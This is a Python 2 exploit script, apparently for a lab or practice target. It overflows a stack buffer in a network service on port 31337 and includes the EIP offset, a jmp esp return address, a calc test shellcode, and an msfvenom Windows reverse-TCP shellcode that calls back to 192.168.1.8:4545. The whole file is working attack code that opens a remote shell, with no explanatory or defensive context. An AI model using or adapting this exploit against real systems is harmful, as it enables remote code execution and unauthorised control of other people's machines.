import socket

target = '192.168.140.134'
port = 31337

#size 220, pop calc test
shellcode_calc =  ""
shellcode_calc += "\xb8\x88\x25\x35\xc9\xdb\xc9\xd9\x74\x24"
shellcode_calc += "\xf4\x5a\x29\xc9\xb1\x31\x31\x42\x13\x03"
shellcode_calc += "\x42\x13\x83\xea\x74\xc7\xc0\x35\x6c\x8a"
shellcode_calc += "\x2b\xc6\x6c\xeb\xa2\x23\x5d\x2b\xd0\x20"
shellcode_calc += "\xcd\x9b\x92\x65\xe1\x50\xf6\x9d\x72\x14"
shellcode_calc += "\xdf\x92\x33\x93\x39\x9c\xc4\x88\x7a\xbf"
shellcode_calc += "\x46\xd3\xae\x1f\x77\x1c\xa3\x5e\xb0\x41"
shellcode_calc += "\x4e\x32\x69\x0d\xfd\xa3\x1e\x5b\x3e\x4f"
shellcode_calc += "\x6c\x4d\x46\xac\x24\x6c\x67\x63\x3f\x37"
shellcode_calc += "\xa7\x85\xec\x43\xee\x9d\xf1\x6e\xb8\x16"
shellcode_calc += "\xc1\x05\x3b\xff\x18\xe5\x90\x3e\x95\x14"
shellcode_calc += "\xe8\x07\x11\xc7\x9f\x71\x62\x7a\x98\x45"
shellcode_calc += "\x19\xa0\x2d\x5e\xb9\x23\x95\xba\x38\xe7"
shellcode_calc += "\x40\x48\x36\x4c\x06\x16\x5a\x53\xcb\x2c"
shellcode_calc += "\x66\xd8\xea\xe2\xef\x9a\xc8\x26\xb4\x79"
shellcode_calc += "\x70\x7e\x10\x2f\x8d\x60\xfb\x90\x2b\xea"
shellcode_calc += "\x11\xc4\x41\xb1\x7f\x1b\xd7\xcf\xcd\x1b"
shellcode_calc += "\xe7\xcf\x61\x74\xd6\x44\xee\x03\xe7\x8e"
shellcode_calc += "\x4b\xeb\x05\x1b\xa1\x84\x93\xce\x08\xc9"
shellcode_calc += "\x23\x25\x4e\xf4\xa7\xcc\x2e\x03\xb7\xa4"
shellcode_calc += "\x2b\x4f\x7f\x54\x41\xc0\xea\x5a\xf6\xe1"
shellcode_calc += "\x3e\x39\x99\x71\xa2\x90\x3c\xf2\x41\xed"

#size 389 bytes   msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.8 lport=4545
shellcode =  ""
shellcode += "\xba\x77\xf3\x2d\x6f\xda\xcd\xd9\x74\x24\xf4\x5b"
shellcode += "\x29\xc9\xb1\x5b\x31\x53\x14\x03\x53\x14\x83\xc3"
shellcode += "\x04\x95\x06\xd1\x87\xdb\xe9\x2a\x58\xbb\x60\xcf"
shellcode += "\x69\xfb\x17\x9b\xda\xcb\x5c\xc9\xd6\xa0\x31\xfa"
shellcode += "\x6d\xc4\x9d\x0d\xc5\x62\xf8\x20\xd6\xde\x38\x22"
shellcode += "\x54\x1c\x6d\x84\x65\xef\x60\xc5\xa2\x0d\x88\x97"
shellcode += "\x7b\x5a\x3f\x08\x0f\x16\xfc\xa3\x43\xb7\x84\x50"
shellcode += "\x13\xb6\xa5\xc6\x2f\xe1\x65\xe8\xfc\x9a\x2f\xf2"
shellcode += "\xe1\xa6\xe6\x89\xd2\x5d\xf9\x5b\x2b\x9e\x56\xa2"
shellcode += "\x83\x6d\xa6\xe2\x24\x8d\xdd\x1a\x57\x30\xe6\xd8"
shellcode += "\x25\xee\x63\xfb\x8e\x65\xd3\x27\x2e\xaa\x82\xac"
shellcode += "\x3c\x07\xc0\xeb\x20\x96\x05\x80\x5d\x13\xa8\x47"
shellcode += "\xd4\x67\x8f\x43\xbc\x3c\xae\xd2\x18\x93\xcf\x05"
shellcode += "\xc3\x4c\x6a\x4d\xee\x99\x07\x0c\x67\x6e\x2a\xaf"
shellcode += "\x77\xf8\x3d\xdc\x45\xa7\x95\x4a\xe6\x20\x30\x8c"
shellcode += "\x7f\x26\xc3\x42\xc7\x26\x3d\x63\x38\x6f\xfa\x37"
shellcode += "\x68\x07\x2b\x38\xe3\xd7\xd4\xed\x9e\xd6\x42\xce"
shellcode += "\xf7\xd9\x9a\xa6\x05\xd9\x8b\xf7\x83\x3f\xfb\xa7"
shellcode += "\xc3\xef\xbc\x17\xa4\x5f\x55\x72\x2b\x80\x45\x7d"
shellcode += "\xe1\xa9\xec\x92\x5c\x82\x98\x0b\xc5\x58\x38\xd3"
shellcode += "\xd3\x25\x7a\x5f\xd6\xda\x35\xa8\x93\xc8\x22\xcf"
shellcode += "\x5b\x10\xb3\x7a\x5c\x7a\xb7\x2c\x0b\x12\xb5\x09"
shellcode += "\x7b\xbd\x46\x7c\xff\xb9\xb9\x01\x36\xb2\x8c\x97"
shellcode += "\x76\xac\xf0\x77\x77\x2c\xa7\x1d\x77\x44\x1f\x46"
shellcode += "\x24\x71\x60\x53\x58\x2a\xf5\x5c\x09\x9f\x5e\x35"
shellcode += "\xb7\xc6\xa9\x9a\x48\x2d\xaa\xdd\xb7\xb0\x85\x45"
shellcode += "\xd0\x4a\x96\x75\x20\x20\x16\x26\x48\xbf\x39\xc9"
shellcode += "\xb8\x40\x90\x82\xd0\xcb\x75\x60\x40\xcc\x5f\x24"
shellcode += "\xdc\xcd\x6c\xfd\xef\xb4\x1d\x02\x10\x49\x34\x67"
shellcode += "\x10\x4a\x38\x99\x2c\x9d\x01\xef\x73\x1e\x36\xf0"
shellcode += "\x69\x8a\x43\x99\x37\x5f\xee\xc4\xc7\x8a\x2d\xf1"
shellcode += "\x4b\x3e\xce\x06\x53\x4b\xcb\x43\xd3\xa0\xa1\xdc"
shellcode += "\xb6\xc6\x16\xdc\x92"
#jmp esp: 080414c3 ||  080416bf
#eip offset at 146 bytes
buf = '\x41'*146 + '\xc3\x14\x04\x08' + '\x90'*12 + shellcode + '\x43'*(1500-150-12-389)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
print '[+] Sending evil buf...'
s.send(buf+'\n')
resp = s.recv(1024)
print resp